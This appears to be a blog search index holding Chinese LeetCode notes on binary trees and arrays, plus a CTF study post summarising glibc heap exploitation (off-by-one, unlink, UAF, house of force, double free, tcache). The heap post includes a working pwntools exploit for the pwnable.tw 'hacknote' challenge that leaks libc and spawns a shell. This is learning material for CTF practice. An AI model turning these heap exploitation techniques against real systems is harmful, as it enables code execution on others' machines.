<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>leetcode刷题记录（二）</title>
      <link href="/2022/01/30/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C%EF%BC%89/"/>
      <url>/2022/01/30/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>二叉搜索树相关</p><span id="more"></span><h2 id="0x01-二叉树最底层最左边的值"><a href="#0x01-二叉树最底层最左边的值" class="headerlink" title="0x01 二叉树最底层最左边的值"></a>0x01 二叉树最底层最左边的值</h2><p>给定一个二叉树的 <strong>根节点</strong> <code>root</code>，请找出该二叉树的 <strong>最底层 最左边</strong> 节点的值。</p><p>假设二叉树中至少有一个节点。</p><p><img src="https://assets.leetcode.com/uploads/2020/12/14/tree2.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: [1,2,3,4,null,5,6,null,null,7]</span><br><span class="line">输出: 7</span><br></pre></td></tr></table></figure><h3 id="法一：前序遍历DFS"><a href="#法一：前序遍历DFS" class="headerlink" title="法一：前序遍历DFS"></a>法一：前序遍历DFS</h3><p>使用DFS递归遍历树的所有节点,记录当前节点的层级level与已遍历节点的最大层级maxLevel<br>每当level超过maxLevel时，将当前节点赋值给res，另外更新maxLevel<br>遍历完成后，res就是要找的节点，返回该节点的值即可</p><p>遍历到新的一层的第一个节点为最底层，最左边的节点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> maxlevel=<span class="number">-1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">     <span class="built_in">dfs</span>(root,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(TreeNode * root,<span class="keyword">int</span> level)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        <span class="keyword">if</span>(level&gt;maxlevel)&#123;</span><br><span class="line">            res = root-&gt;val;</span><br><span class="line">            maxlevel = level;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">dfs</span>(root-&gt;left,level+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">dfs</span>(root-&gt;right,level+<span class="number">1</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="法二：层序遍历BFS"><a href="#法二：层序遍历BFS" class="headerlink" title="法二：层序遍历BFS"></a>法二：层序遍历BFS</h3><p>更新每层第一个元素值，取最后一次更新值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">      queue&lt;TreeNode*&gt; q;</span><br><span class="line">      q.<span class="built_in">push</span>(root);</span><br><span class="line">      <span class="keyword">int</span> leftnode;</span><br><span class="line">      <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">          <span class="keyword">int</span> size = q.<span class="built_in">size</span>();</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">int</span> i=size;i;i--)&#123;</span><br><span class="line">              <span class="keyword">auto</span> node = q.<span class="built_in">front</span>();</span><br><span class="line">              <span class="keyword">if</span>(i==size)</span><br><span class="line">                  leftnode = node-&gt;val;</span><br><span class="line">              q.<span class="built_in">pop</span>();</span><br><span class="line">              <span class="keyword">if</span>(node-&gt;left) q.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">              <span class="keyword">if</span>(node-&gt;right) q.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">return</span> leftnode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="0x02-往完全二叉树添加节点"><a href="#0x02-往完全二叉树添加节点" class="headerlink" title="0x02 往完全二叉树添加节点"></a>0x02 往完全二叉树添加节点</h2><p>完全二叉树是每一层（除最后一层外）都是完全填充（即，节点数达到最大，第 n 层有 2n-1 个节点）的，并且所有的节点都尽可能地集中在左侧。</p><p>设计一个用完全二叉树初始化的数据结构 CBTInserter，它支持以下几种操作：</p><p>CBTInserter(TreeNode root) 使用根节点为 root 的给定树初始化该数据结构；<br>CBTInserter.insert(int v)  向树中插入一个新节点，节点类型为 TreeNode，值为 v 。使树保持完全二叉树的状态，并返回插入的新节点的父节点的值；<br>CBTInserter.get_root() 将返回树的根节点。</p><p>示例 1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：inputs = [<span class="string">&quot;CBTInserter&quot;</span>,<span class="string">&quot;insert&quot;</span>,<span class="string">&quot;get_root&quot;</span>], inputs = [[[<span class="number">1</span>]],[<span class="number">2</span>],[]]</span><br><span class="line">输出：[<span class="keyword">null</span>,<span class="number">1</span>,[<span class="number">1</span>,<span class="number">2</span>]]</span><br><span class="line"></span><br><span class="line">输入：inputs = [<span class="string">&quot;CBTInserter&quot;</span>,<span class="string">&quot;insert&quot;</span>,<span class="string">&quot;insert&quot;</span>,<span class="string">&quot;get_root&quot;</span>], inputs = [[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]],[<span class="number">7</span>],[<span class="number">8</span>],[]]</span><br><span class="line">输出：[<span class="keyword">null</span>,<span class="number">3</span>,<span class="number">4</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="使用队列完成二叉树的层序遍历"><a href="#使用队列完成二叉树的层序遍历" class="headerlink" title="使用队列完成二叉树的层序遍历"></a>使用队列完成二叉树的层序遍历</h3><p>通过观察可以发现新节点需要插入层次遍历时第一个出现的 “不完整的节点” （即不同时具有左右孩子节点）。如图中所示，绿色代表当前队列中的节点（规定节点的左右孩子均存在时才将它们一起先后压入队列)，当遍历到 “不完整的节点” 就找到了新节点插入的节点位置，“不完整的节点” 位于队列的头部。在 CBTInserter 函数中实现该过程，找到插入的位置，以及得到当前的队列。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201301559584.jpeg" alt="ce27c552f3c1d653d97978cf52b4b0d.jpg"></p><p>插入操作时，先后检查队列头部节点的左右孩子，若左孩子缺失则将新节点插入其左孩子，右孩子缺失则插入右孩子。当队列头部节点的左右孩子都存在，则将其左右孩子压入队列尾部，队列的头部节点出队列，因为此时它已不是 “不完整的节点” 。更新后的队列的头部节点将是下一个 “不完整的节点”。按照规则依次处理接下来的插入操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CBTInserter</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    queue&lt;TreeNode*&gt; que;</span><br><span class="line">    TreeNode* root;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CBTInserter</span>(TreeNode* root) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;root = root;</span><br><span class="line">        que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (que.<span class="built_in">front</span>()-&gt;left != <span class="literal">nullptr</span> &amp;&amp; que.<span class="built_in">front</span>()-&gt;right != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            que.<span class="built_in">push</span>(que.<span class="built_in">front</span>()-&gt;left);</span><br><span class="line">            que.<span class="built_in">push</span>(que.<span class="built_in">front</span>()-&gt;right);</span><br><span class="line">            que.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">        TreeNode* node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(v);</span><br><span class="line">        TreeNode* fa = que.<span class="built_in">front</span>();</span><br><span class="line">        <span class="keyword">if</span> (fa-&gt;left == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            fa-&gt;left = node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            fa-&gt;right = node;</span><br><span class="line">            que.<span class="built_in">push</span>(fa-&gt;left);</span><br><span class="line">            que.<span class="built_in">push</span>(fa-&gt;right);</span><br><span class="line">            que.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fa-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">TreeNode* <span class="title">get_root</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your CBTInserter object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * CBTInserter* obj = new CBTInserter(root);</span></span><br><span class="line"><span class="comment"> * int param_1 = obj-&gt;insert(v);</span></span><br><span class="line"><span class="comment"> * TreeNode* param_2 = obj-&gt;get_root();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>时间复杂度为 O(n)，队列中存的节点数为 O(n)，所以空间复杂度为 O(n)。</p>]]></content>
      
      
      <categories>
          
          <category> leetcode </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>堆题总结</title>
      <link href="/2022/01/27/%E5%A0%86%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2022/01/27/%E5%A0%86%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>堆基础总结</p><span id="more"></span><h2 id="堆数据结构"><a href="#堆数据结构" class="headerlink" title="堆数据结构"></a>堆数据结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- chunk </span><br><span class="line">| prev_size |  size  |A|M|P|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| <span class="function">user <span class="title">data</span><span class="params">(fd)</span> | <span class="params">(bk)</span>  |</span></span><br><span class="line"><span class="function">||</span></span><br><span class="line"><span class="function">||</span></span><br><span class="line"><span class="function">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- next chunk</span></span><br></pre></td></tr></table></figure><h2 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off By One"></a>Off By One</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>使用循环语句向堆块中写入数据时，循环次数设置错误导致多写入了一个字节</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol><li><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p></li><li><p>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。</p><p>（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。</p><p>（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</p></li></ol><h2 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h2><p>当large bin 中只存在一个chunk时，那么该chunk的两个nextsize 指针都会指向自己</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>unlink过程如下图所示，主要实现堆块合并</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190305154531-a6fafb78-3f1a-1.png" alt="img"></p><p>对于unlink(P,BK,FD)函数本质是赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unlink(P,BK,FD)&#123;</span><br><span class="line">    FD = P -&gt; fd;</span><br><span class="line">    BK = p -&gt; bk;</span><br><span class="line">    FD -&gt; bk = BK;</span><br><span class="line">    BK -&gt; fd = fd;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>堆块结构FD = *(p-0x10)，0x10是由fd指针在堆块的位置决定的，具体利用过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(P-&gt;fd+<span class="number">0x18</span>) = *(P-&gt;bk)</span><br><span class="line">*(P-&gt;bk+<span class="number">0x10</span>) = *(P-&gt;fd)</span><br></pre></td></tr></table></figure><h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>申请任意大小的堆块并在删除时未清空指针数组（即没有设置为NUL），导致悬空指针从而产生UAF</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>例题： pwnable.tw - hacknote</p><p>解题思路：</p><p>通过UAF调用一个存在于堆块，并且被一系列对操作篡改的函数指针控制流劫持从而getshell</p><blockquote><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/03/hacknote/">具体参考文章</a></p></blockquote><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./hacknote&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10102</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">io.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">num</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">num</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">64</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">32</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">64</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)    //unsortbin泄露libc地址</span><br><span class="line"></span><br><span class="line">libc_base = u32(io.recv(<span class="number">8</span>)[<span class="number">4</span>:<span class="number">8</span>])-<span class="number">0x1b07b0</span></span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,p32(system_addr)+<span class="string">&quot;;sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><ul><li>能够控制top chunk的size域（如堆溢出）</li><li>能够自由控制堆分配size大小，如申请负数的堆</li></ul><p>向上申请chunk实现任意地址写</p><h3 id="例题-bamboobox"><a href="#例题-bamboobox" class="headerlink" title="例题 bamboobox"></a>例题 bamboobox</h3><p>修改长度可以覆盖到top chunk的size位置从而修改top chunk size= -1,因为size为无符号数，-1被解释为0xffffff。</p><p>利用house of force 将top chunk位置放在heap base，可以是got表地址也可以是分配的堆块地址。</p><p>再申请一个0x10堆块去修改函数指针为指定地址。</p><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>free了两次堆块，在glibc中的检查如下：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190313123823-d61a9032-4549-1.png" alt="img"></p><p>检查main_arean是否指向了原来的一个chunk,绕过只需要</p><p>free(p1);free(p2);free(p1)，改写fdd指针一般执行add函数，然后连续free出chunk2,chunk1和构造的fake_chunk（这个chunk的地址在got表上），对got表进行一个覆写，将puts函数got表改写成magic函数的地址。</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190313123837-de246bae-4549-1.png" alt="img"></p><p> malloc出一个chunk1，更改chunk1的fd，又由于此时chunk1在fastbin list，因此可以指向一个fakebin实现任意地址写</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190313123859-eb7d95dc-4549-1.png" alt="img"></p><h2 id="Off-by-null-amp-amp-Tcache-amp-amp-Overlap"><a href="#Off-by-null-amp-amp-Tcache-amp-amp-Overlap" class="headerlink" title="Off by null &amp;&amp; Tcache &amp;&amp; Overlap"></a>Off by null &amp;&amp; Tcache &amp;&amp; Overlap</h2><ul><li><p>off-by-null: 利用改写将pre_issue位改成\x00然后导致前面一个堆块莫名其妙的就free了（当然不是真的莫名其妙，详细请看堆块结构和记录，简单的说就是pre_issue是位了记录前一个堆块free or use 情况的）。接着就是利用堆块合并，获得一个free的但是其实并没有free的堆块，这就是overlap。整个过程其实说明了，off-by-null可以触发overlap，并且还是powerful的，可以用来泄漏地址。也可以用来修改fd</p><blockquote><p>strcpy 字符串函数:复制时，遇到结束符 <code>\x00</code> 才会停止复制。复制结束后，会在最后写入一个结束符 <code>\x00</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c9a4fb89febac9551f72c9dd1c35929f.png" alt="Pasted image 20210923152332.png"></p><p>strlen: j不将’\x00’结束符计入字符串长度</p></blockquote></li><li><p>tcache: 这个机制和fastbin很像，但是为了效率会比fastbin少很多检查。并且堆块都会在tacahe走一遍再出来给我们使用，有一些特殊情况不会比如合并了的unsortedbin。他总共有7个，满了才会用其他的类别的chunk。对double free的检查基本没有。</p></li></ul><p>例题：<a href="https://blog.csdn.net/weixin_43921239/article/details/109252945">HITCON_2018_children_tcache</a></p><p>待补充ing…</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://trick.ink/article/Heap_Learn/">https://trick.ink/article/Heap_Learn/</a></p><p><a href="https://blog.csdn.net/m0_56897090/article/details/120510003">https://blog.csdn.net/m0_56897090/article/details/120510003</a></p><p><a href="https://www.freebuf.com/system/171261.html">https://www.freebuf.com/system/171261.html</a></p><p><a href="https://xz.aliyun.com/t/4324#toc-15">https://xz.aliyun.com/t/4324#toc-15</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leetcode数据结构刷题(一)</title>
      <link href="/2022/01/27/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/01/27/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>Leetcode数据结构练习</p><span id="more"></span><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="最大子序和"><a href="#最大子序和" class="headerlink" title="最大子序和"></a>最大子序和</h3><p>思路：动态规划</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pre = <span class="number">0</span>,maxn = nums[<span class="number">0</span>];     </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x:nums)&#123;</span><br><span class="line">            pre = Math.max(pre+x,x);</span><br><span class="line">            maxn = Math.max(pre,maxn);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxn;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h3><p><strong>哈希表</strong>降时间复杂度从o(n)到o(1)</p><p>创建一个哈希表，对于每一个 <code>x</code>，我们首先查询哈希表中是否存在 <code>target - x</code>，然后将 <code>x</code> 插入到哈希表中，即可保证不会让 <code>x</code> 和自己匹配。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; hashtable = <span class="keyword">new</span> HashMap&lt;Integer, Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hashtable.containsKey(target - nums[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;hashtable.get(target - nums[i]), i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hashtable.put(nums[i], 